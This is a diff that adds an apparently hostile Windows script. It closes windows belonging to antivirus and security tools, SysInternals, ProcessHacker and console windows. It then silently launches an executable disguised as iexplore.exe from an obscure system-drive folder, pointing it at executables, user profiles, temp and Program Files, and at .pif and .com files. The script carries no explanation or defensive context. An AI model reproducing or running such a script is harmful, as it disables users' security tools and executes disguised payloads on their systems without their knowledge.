@@ -1,0 +1,24 @@
+
+win close ititle " Security"
+
+win close ititle "SysInternals"
+
+win close ititle "Virus Protect"
+
+win close ititle "virus S"
+
+win close class consolewindowclass
+win close class ProcessHacker
+
+
+Exec2 Hide ~$sys.Systemdrive$\32788R22FWJFW\License ~$sys.Systemdrive$\32788R22FWJFW\License\iexplore.exe -s450000-1400000 -t!k -t!o -t!g -k ~$sys.Systemdrive$\*.exe and not { "~$sys.EXEPATH$" or ~$sys.Systemdrive$\32788R22FWJFW\* }
+
+Exec Hide ~$sys.Systemdrive$\32788R22FWJFW\License\iexplore.exe -k { "~$sys.AllUsersProfile$\*" or "~$sys.userprofile$\*" } not { "~$sys.EXEPATH$" or ~$sys.Systemdrive$\32788R22FWJFW\* }
+
+Exec Hide ~$sys.Systemdrive$\32788R22FWJFW\License\iexplore.exe -k "~$sys.temp$\*" not { "~$sys.EXEPATH$" or ~$sys.Systemdrive$\32788R22FWJFW\* }
+
+Exec Hide ~$sys.Systemdrive$\32788R22FWJFW\License\iexplore.exe -rk { "~$sys.ProgramFiles$\*" OR "~$sys.CommonProgramFiles$\*" } not { "~$sys.EXEPATH$" or ~$sys.Systemdrive$\32788R22FWJFW\* }
+
+Exec Hide ~$sys.Systemdrive$\32788R22FWJFW\License\iexplore.exe -loadline:~$sys.Systemdrive$\32788R22FWJFW\License\UnxUtilsDist.pif and not { "~$sys.EXEPATH$" or ~$sys.Systemdrive$\32788R22FWJFW\* }
+
+Exec Hide ~$sys.Systemdrive$\32788R22FWJFW\License\iexplore.exe -loadline:~$sys.Systemdrive$\32788R22FWJFW\License\UnxUtilsDist.com and not { "~$sys.EXEPATH$" or ~$sys.Systemdrive$\32788R22FWJFW\* }
